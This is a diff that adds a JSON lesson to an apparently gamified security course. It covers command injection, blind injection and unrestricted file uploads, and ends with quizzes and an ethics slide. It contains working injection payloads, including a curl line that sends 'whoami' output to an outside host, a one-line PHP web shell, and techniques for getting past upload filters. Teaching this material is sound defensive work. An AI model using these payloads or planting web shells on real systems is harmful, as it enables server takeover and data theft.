@@ -1,0 +1,114 @@
+{
+    "id": "l7",
+    "chapterId": "ch_8",
+    "title": "Command Injection & File Uploads 💣",
+    "description": "Execute system commands and upload web shells.",
+    "xpReward": 40,
+    "estimatedMinutes": 12,
+    "section": "Injection",
+    "slides": [
+        {
+            "id": "s_l7_1",
+            "type": "text",
+            "title": "Command Injection (OS Commanding) 💻",
+            "content": "# Talking Directly to the Server\n\n**Command Injection** occurs when an application passes unsafe user input to a **system shell** (e.g., `exec()`, `system()`, `popen()`).\n\n**Example Vulnerable Code (PHP):**\n```php\n$ip = $_POST['ip'];\nsystem(\"ping -c 4 \" . $ip);\n```\n\n**Attack Payload:**\n- Input: `127.0.0.1; whoami`\n- Resulting Command: `ping -c 4 127.0.0.1; whoami`\n\n**The shell executes `ping` AND `whoami`.**\n\n**Chaining Commands:**\n- `;` : Execute next command (Linux/Windows).\n- `&&` : Execute next command if first succeeded.\n- `||` : Execute next command if first failed.\n- `|` : Pipe output to next command.\n- `&` : Execute in background (Windows)."
+        },
+        {
+            "id": "s_l7_2",
+            "type": "quiz",
+            "title": "Command Chaining 🧠",
+            "content": "",
+            "quizData": {
+                "id": "q_l7_1",
+                "type": "multiple_choice",
+                "question": "In a Unix shell, what does the `;` character do?",
+                "options": [
+                    {
+                        "id": "opt1",
+                        "text": "Comment out the rest of the line.",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt2",
+                        "text": "Run commands in the background.",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt3",
+                        "text": "Separate multiple commands to be executed sequentially.",
+                        "isCorrect": true
+                    },
+                    {
+                        "id": "opt4",
+                        "text": "Pipe output.",
+                        "isCorrect": false
+                    }
+                ],
+                "explanation": "The semicolon allows multiple commands on one line.",
+                "xpReward": 10
+            }
+        },
+        {
+            "id": "s_l7_3",
+            "type": "text",
+            "title": "Blind Command Injection 👁️‍🗨️",
+            "content": "# When You Can't See the Output\n\nSometimes the application executes the command but doesn't show you the results. This is **Blind Command Injection**.\n\n**Detection Techniques:**\n1.  **Time Delays**: `127.0.0.1; sleep 10` -> If the page takes 10 seconds to load, injection is confirmed.\n2.  **Out-of-Band (DNS/HTTP)**: Force the server to connect to you.\n    - `127.0.0.1; nslookup your-server.com`\n    - `127.0.0.1; curl http://192.168.56.102:8000/?c=$(whoami)`\n3.  **Writing to a file and accessing it**:\n    - `127.0.0.1; whoami > /var/www/html/output.txt`\n    - Then browse to `http://site.com/output.txt`."
+        },
+        {
+            "id": "s_l7_4",
+            "type": "text",
+            "title": "Unrestricted File Upload 📤",
+            "content": "# Uploading a Web Shell\n\nIf a website allows you to upload files (profile picture, resume) without proper validation, you can upload a **Web Shell**—a script that gives you command execution.\n\n**Steps to Exploit:**\n1.  **Create a simple PHP web shell**:\n    ```php\n    <?php system($_GET['cmd']); ?>\n    ```\n2.  **Save as** `shell.php` or `shell.php.jpg`.\n3.  **Upload** via the vulnerable form.\n4.  **Locate** the uploaded file (e.g., `/uploads/shell.php`).\n5.  **Execute commands**: `http://site.com/uploads/shell.php?cmd=whoami`\n\n**Bypassing Restrictions:**\n- **Extension Blacklist**: Try `.php5`, `.phtml`, `.php.jpg`.\n- **Content-Type Validation**: Change `Content-Type: image/jpeg` using Burp Suite.\n- **Magic Bytes**: Add `GIF89a;` at the start of the file to bypass file signature checks."
+        },
+        {
+            "id": "s_l7_5",
+            "type": "code",
+            "title": "File Upload Bypass with Burp 🛠️",
+            "content": "Intercept the upload request and modify it to bypass client-side or server-side restrictions.",
+            "codeSnippet": "# Original Request (Blocked .php)\nPOST /upload.php HTTP/1.1\nContent-Type: multipart/form-data; boundary=----WebKitFormBoundary\n\n------WebKitFormBoundary\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\nContent-Type: application/x-php\n\n<?php system($_GET['cmd']); ?>\n\n# Modified Request (Bypass with double extension)\n... filename=\"shell.php.jpg\"\nContent-Type: image/jpeg\n\nGIF89a;\n<?php system($_GET['cmd']); ?>\n```",
+            "codeLanguage": "http",
+            "canRunCode": false
+        },
+        {
+            "id": "s_l7_6",
+            "type": "quiz",
+            "title": "File Upload Bypass 🧠",
+            "content": "",
+            "quizData": {
+                "id": "q_l7_2",
+                "type": "multiple_choice",
+                "question": "You upload `shell.php` but the server blocks `.php` files. Which extension is least likely to be blacklisted and still execute as PHP?",
+                "options": [
+                    {
+                        "id": "opt1",
+                        "text": ".exe",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt2",
+                        "text": ".txt",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt3",
+                        "text": ".phtml",
+                        "isCorrect": true
+                    },
+                    {
+                        "id": "opt4",
+                        "text": ".jpg",
+                        "isCorrect": false
+                    }
+                ],
+                "explanation": "`.phtml` is a common alternative PHP extension that may be allowed by misconfigured servers.",
+                "xpReward": 10
+            }
+        },
+        {
+            "id": "s_l7_7",
+            "type": "warning",
+            "title": "Web Shell Ethics ⚠️",
+            "content": "## Leaving a Backdoor\n\nIn a professional penetration test, **do not leave a web shell behind** unless explicitly authorized and required for the engagement. Always remove any uploaded files and document the exact path and timestamp for the client to clean up."
+        }
+    ]
+}
